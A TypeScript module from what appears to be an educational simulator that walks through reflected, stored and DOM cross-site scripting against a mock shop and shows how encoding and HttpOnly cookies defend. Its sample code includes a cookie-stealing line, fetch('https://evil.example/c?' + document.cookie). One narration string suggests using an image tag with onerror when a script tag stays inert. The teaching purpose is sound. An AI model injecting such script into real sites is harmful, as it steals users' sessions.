import { readChoice, refusal } from '../../algorithms/form';
import type { Step } from '../../types/visualization';
import { EMPTY, readBytes } from '../steps';
import { USERS } from '../web/data';
import { createEvil, EVIL_ORIGIN, evilStolen } from '../web/evil';
import { findScripts } from '../web/html';
import { loadInner, loadPage, type PageRun, type ScriptRun } from '../web/page';
import { createShop, SAFE_SHOP, SHOP_ORIGIN } from '../web/shop';
import { injectedScripts } from '../web/shop-pages';
import { createStory, resultOf, type Story } from '../web/story';
import { createWorld, type World } from '../web/world';

export const crossSiteScriptingCode = `// reflected: the search page repeats the address
page = 'Results for ' + encode(request.q)

// stored: the comments page repeats what was saved
page = comments.map((c) => c.author + ': ' + encode(c.body))

// DOM: the page's own script repeats what is after the #
text = decodeURIComponent(location.hash.slice(1))
if (encoding) welcome.textContent = text
else welcome.innerHTML = text

function encode(text) {
  return encoding ? replace(text, '<', '&lt;') /* and & > " ' */ : text
}

// an injected script runs as if the shop had written it
fetch('https://evil.example/c?' + document.cookie)`;

export const WHERE_OPTIONS = ['Reflected', 'Stored', 'DOM'];

export const DEFENSE_OPTIONS = ['Off', 'On', 'HttpOnly only'];

const MALLORY = { name: 'mallory', password: 'stored-xss', role: 'customer' };

const LINES: Record<string, string> = { Reflected: "page = 'Results for '", Stored: 'page = comments.map', DOM: 'text = decodeURIComponent' };

type Run = { world: World; story: Story; input: string };

const visible = (run: PageRun) => run.response.body.split('\n').slice(0, -1).join('\n');

function reflected({ world, input }: Run) {
  const run = loadPage(world, `${SHOP_ORIGIN}/search?q=${encodeURIComponent(input)}`, EVIL_ORIGIN);
  return { html: visible(run), scripts: injectedScripts(run.scripts) };
}

function stored({ world, story, input }: Run) {
  const signIn = world.send({ method: 'POST', url: `${SHOP_ORIGIN}/signin`, headers: {}, body: { name: MALLORY.name, password: MALLORY.password } }, 'attacker');
  const cookie = `sid=${signIn.setCookies[0]!.value}`;
  world.send({ method: 'POST', url: `${SHOP_ORIGIN}/comments`, headers: { cookie }, body: { body: input } }, 'attacker');
  story.step({ title: 'mallory posts a comment', why: 'The shop saves the text as it is. It is only a row in a table for now, and it will reach everyone who opens the page.', next: 'alice opens the comments.', line: 'page = comments.map' });
  const run = loadPage(world, `${SHOP_ORIGIN}/comments`);
  return { html: visible(run), scripts: injectedScripts(run.scripts) };
}

function dom({ world, input }: Run, encoded: boolean) {
  const run = loadInner(world, `${SHOP_ORIGIN}/welcome#${input}`, input);
  return { html: encoded ? `(as text) ${input}` : input, scripts: run.scripts };
}

const notUnderstood = 'This simulation does not understand this script. It runs no real code, so it can\'t say what it would do. A browser would try to run it.';

function reportScript(story: Story, script: ScriptRun, emptyCookie: boolean) {
  const heading: Record<ScriptRun['status'], string> = {
    ran: 'A script runs in the shop\'s origin',
    blocked: 'A script is blocked',
    'not understood': 'A script the simulation can\'t read',
    'waits for a click': 'A script waits for a click',
    'failed to load': 'A script fails to load',
  };
  let why = script.actions.join(' ');
  if (script.status === 'ran') why = `It did this: ${why}. The browser can't tell it from the shop's own code, so it can do anything the page can.`;
  if (script.status === 'not understood') why = notUnderstood;
  if (script.status === 'waits for a click') why = 'This handler only runs if someone clicks, so no one has run it yet. It is still in the page, and it is still a bug.';
  if (emptyCookie) why += ' The sid cookie is HttpOnly, so document.cookie gave empty text. That saved the cookie, but the script still ran.';
  story.step({ title: heading[script.status], why, line: "fetch('https://evil.example/c?'", text: { label: 'Script', lines: { Source: script.source } } });
}

const summary = (ran: boolean, encoded: boolean, input: string, inert: boolean) => {
  if (ran) return 'The input became code on the shop\'s page. The browser ran it with everything that page has.';
  if (encoded) return /[<>&"']/.test(input) ? 'Encoding turned the markup into text, so the browser drew it and ran nothing.' : 'This text had nothing to encode, so the page simply shows it.';
  if (inert) return 'A <script> tag set through innerHTML stays inert. Browsers do not run it, so this payload does nothing here. Try an image tag with onerror.';
  return 'Nothing in this text ran.';
};

const PLAY: Record<string, (run: Run, encoded: boolean) => { html: string; scripts: ScriptRun[] }> = { Reflected: reflected, Stored: stored, DOM: dom };

export function crossSiteScriptingSteps(values: Record<string, string>): Step[] {
  const where = readChoice(values, 'where', 'Where', WHERE_OPTIONS);
  if (!where.ok) return refusal('Cannot run this', where.why, EMPTY);
  const input = readBytes(values, 'input', 'Input', { min: 1, max: 120 });
  if (!input.ok) return refusal('Cannot run this', input.why, EMPTY);
  const defense = readChoice(values, 'defense', 'Defense', DEFENSE_OPTIONS);
  if (!defense.ok) return refusal('Cannot run this', defense.why, EMPTY);

  const encoded = defense.value === 'On';
  const httpOnly = defense.value === 'HttpOnly only';
  const site = createShop({ users: [...SAFE_SHOP.users, MALLORY], encode: encoded, csp: 'none', cookie: { ...SAFE_SHOP.cookie, httpOnly } });
  const world = createWorld([site, createEvil()]);
  const story = createStory({ world, code: crossSiteScriptingCode, nodes: ['browser', 'attacker', 'shop', 'evil'] });
  const alice = USERS[0];
  world.browser.submit(`${SHOP_ORIGIN}/signin`, { name: alice.name, password: alice.password });
  story.step({
    title: `${where.value}, encoding ${encoded ? 'on' : 'off'}`,
    why: `alice is signed in, with a session cookie${httpOnly ? ' marked HttpOnly' : ' that scripts can read'}. The input is "${input.value}".`,
    next: where.value === 'DOM' ? 'alice opens a link with that text after the #.' : 'The text is on its way to a page.',
    line: LINES[where.value]!,
  });

  const { html, scripts } = PLAY[where.value]!({ world, story, input: input.value }, encoded);
  const inDom = where.value === 'DOM';
  story.step({
    title: inDom ? 'The page writes the fragment into itself' : 'The page reaches alice\'s browser',
    why: inDom ? `The text after the # was never sent to the server, so no server filter could see it. The page's own script writes it with ${encoded ? 'textContent' : 'innerHTML'}.` : `The shop built this page with the text ${encoded ? 'encoded' : 'as it arrived'}.`,
    next: 'What does the browser do with it?',
    line: LINES[where.value]!,
    text: { label: 'Page', lines: { Source: html } },
  });
  const stolenBefore = evilStolen(world);
  const emptyCookie = httpOnly && stolenBefore.includes('');
  for (const script of scripts) reportScript(story, script, emptyCookie && script.status === 'ran');

  const ran = scripts.some((script) => script.status === 'ran');
  const inert = findScripts(input.value, 'page').length > findScripts(input.value, 'inner').length;
  const stolen = stolenBefore.filter((text) => text.includes('sid='));
  const shown = stolen[0] ?? (stolenBefore.includes('') ? 'empty text' : 'nothing');
  story.step({
    title: ran ? 'The input ran as code' : 'Nothing ran',
    why: `${summary(ran, encoded, input.value, inDom && inert)}${stolen.length > 0 ? ` evil.example now holds ${stolen[0]}, and the attacker can use it as alice.` : ''}`,
    line: 'function encode',
    variables: { stolen: shown, result: resultOf(ran) },
  });
  return story.steps;
}
